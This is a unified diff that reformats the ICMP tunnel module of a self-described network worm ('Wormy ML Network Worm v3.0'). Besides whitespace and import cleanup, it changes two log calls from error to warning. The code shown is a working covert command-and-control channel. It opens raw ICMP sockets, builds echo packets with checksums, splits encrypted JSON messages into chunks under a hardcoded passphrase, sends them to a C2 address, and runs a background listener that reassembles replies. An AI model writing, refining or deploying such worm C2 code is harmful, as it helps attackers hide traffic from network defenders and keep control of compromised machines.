@@ -2,8 +2,17 @@
 Wormy ML Network Worm v3.0 - Real ICMP Tunnel C2 Channel
 Encapsulates encrypted data inside ICMP Echo Request/Reply payloads.
 """
-import os, sys, socket, struct, time, json, hashlib, base64, threading
-from typing import Optional, Dict, List
+
+import base64
+import hashlib
+import json
+import os
+import socket
+import struct
+import sys
+import threading
+import time
+from typing import Dict, List, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
@@ -15,9 +24,9 @@ def _checksum(data: bytes) -> int:
         data += b"\x00"
     s = 0
     for i in range(0, len(data), 2):
-        s += (data[i] << 8) + data[i+1]
-    s  = (s >> 16) + (s & 0xFFFF)
-    s += (s >> 16)
+        s += (data[i] << 8) + data[i + 1]
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
     return ~s & 0xFFFF
 
 
@@ -44,51 +53,48 @@ class ICMPTunnel:
     """
 
     ICMP_ECHO_REQUEST = 8
-    ICMP_ECHO_REPLY   = 0
-    CHUNK_SIZE        = 1400   # bytes of payload per ICMP packet
-    PASSPHRASE        = b"wormy-icmp-v3"
+    ICMP_ECHO_REPLY = 0
+    CHUNK_SIZE = 1400  # bytes of payload per ICMP packet
+    PASSPHRASE = b"wormy-icmp-v3"
 
-    def __init__(self, c2_ip: str, session_key: Optional[bytes] = None,
-                 identifier: int = None):
-        self.c2_ip      = c2_ip
-        self.key        = session_key or self.PASSPHRASE
+    def __init__(self, c2_ip: str, session_key: Optional[bytes] = None, identifier: int = None):
+        self.c2_ip = c2_ip
+        self.key = session_key or self.PASSPHRASE
         self.session_id = identifier or (os.getpid() & 0xFFFF)
         self._sock: Optional[socket.socket] = None
-        self._recv_buf: Dict[int, bytes]    = {}   # seq -> chunk
-        self._lock      = threading.Lock()
-        self._listener  = None
-        self._running   = False
+        self._recv_buf: Dict[int, bytes] = {}  # seq -> chunk
+        self._lock = threading.Lock()
+        self._listener = None
+        self._running = False
 
     # ─── socket management ───────────────────────────────────────────────────
 
     def _open_socket(self) -> bool:
         try:
-            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
-                                       socket.IPPROTO_ICMP)
+            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             self._sock.settimeout(5)
             return True
         except PermissionError:
-            logger.error("ICMP tunnel requires root/admin privileges")
+            logger.warning("ICMP tunnel requires root/admin privileges — skipping")
             return False
         except Exception as e:
-            logger.error(f"ICMP socket error: {e}")
+            logger.warning(f"ICMP socket error: {e}")
             return False
 
     # ─── packet build / parse ─────────────────────────────────────────────────
 
-    def _build_echo(self, seq: int, payload: bytes,
-                    icmp_type: int = ICMP_ECHO_REQUEST) -> bytes:
+    def _build_echo(self, seq: int, payload: bytes, icmp_type: int = ICMP_ECHO_REQUEST) -> bytes:
         """Build a raw ICMP Echo packet with the given payload."""
         # ICMP header: type(1) code(1) checksum(2) id(2) seq(2)
-        header = struct.pack("!BBHHH", icmp_type, 0, 0,
-                             self.session_id & 0xFFFF, seq & 0xFFFF)
-        raw    = header + payload
-        cs     = _checksum(raw)
-        return struct.pack("!BBHHH", icmp_type, 0, cs,
-                           self.session_id & 0xFFFF, seq & 0xFFFF) + payload
+        header = struct.pack("!BBHHH", icmp_type, 0, 0, self.session_id & 0xFFFF, seq & 0xFFFF)
+        raw = header + payload
+        cs = _checksum(raw)
+        return (
+            struct.pack("!BBHHH", icmp_type, 0, cs, self.session_id & 0xFFFF, seq & 0xFFFF)
+            + payload
+        )
 
-    def _parse_reply(self, raw_packet: bytes
-                     ) -> Optional[tuple]:
+    def _parse_reply(self, raw_packet: bytes) -> Optional[tuple]:
         """
         Parse raw IP+ICMP packet from recvfrom.
         Returns (icmp_type, identifier, seq, payload) or None.
@@ -96,7 +102,7 @@ class ICMPTunnel:
         try:
             # Skip IP header (first 20 bytes minimum)
             ip_ihl = (raw_packet[0] & 0x0F) * 4
-            icmp   = raw_packet[ip_ihl:]
+            icmp = raw_packet[ip_ihl:]
             if len(icmp) < 8:
                 return None
             icmp_type, _, _, ident, seq = struct.unpack("!BBHHH", icmp[:8])
@@ -122,14 +128,13 @@ class ICMPTunnel:
             return False
 
         payload = json.dumps(message).encode()
-        chunks  = [payload[i:i+self.CHUNK_SIZE]
-                   for i in range(0, len(payload), self.CHUNK_SIZE)]
-        total   = len(chunks)
+        chunks = [payload[i : i + self.CHUNK_SIZE] for i in range(0, len(payload), self.CHUNK_SIZE)]
+        total = len(chunks)
         logger.info(f"ICMP tunnel: sending {len(payload)} B in {total} chunks")
 
         # First packet carries metadata: total_chunks in first 4 bytes
         for seq, chunk in enumerate(chunks):
-            enc     = self._encrypt_chunk(chunk)
+            enc = self._encrypt_chunk(chunk)
             # prepend total_chunks (4B) on first packet
             if seq == 0:
                 meta = struct.pack("!I", total) + enc
@@ -138,7 +143,7 @@ class ICMPTunnel:
             pkt = self._build_echo(seq, meta)
             try:
                 self._sock.sendto(pkt, (self.c2_ip, 0))
-                time.sleep(0.05)   # rate limit
+                time.sleep(0.05)  # rate limit
             except Exception as e:
                 logger.error(f"ICMP send error (seq={seq}): {e}")
                 return False
@@ -155,9 +160,9 @@ class ICMPTunnel:
             return None
 
         self._sock.settimeout(timeout)
-        chunks     = {}
-        total_exp  = None
-        deadline   = time.time() + timeout
+        chunks = {}
+        total_exp = None
+        deadline = time.time() + timeout
 
         while time.time() < deadline:
             try:
@@ -176,7 +181,7 @@ class ICMPTunnel:
                 # First chunk carries 4-byte total count prefix
                 if seq == 0 and len(data) >= 4:
                     total_exp = struct.unpack("!I", data[:4])[0]
-                    data      = data[4:]
+                    data = data[4:]
 
                 chunks[seq] = self._decrypt_chunk(data)
 
@@ -205,6 +210,7 @@ class ICMPTunnel:
         Start a background thread that listens for ICMP and calls
         callback(message_dict) for each complete reassembled message.
         """
+
         def _listen():
             if not self._open_socket():
                 return
@@ -213,7 +219,7 @@ class ICMPTunnel:
                 if msg:
                     callback(msg)
 
-        self._running  = True
+        self._running = True
         self._listener = threading.Thread(target=_listen, daemon=True)
         self._listener.start()
         logger.info(f"ICMP listener started (session_id={self.session_id})")
@@ -228,7 +234,7 @@ class ICMPTunnel:
 
     def get_status(self) -> Dict:
         return {
-            "c2_ip":      self.c2_ip,
+            "c2_ip": self.c2_ip,
             "session_id": self.session_id,
             "chunk_size": self.CHUNK_SIZE,
             "socket_open": self._sock is not None,
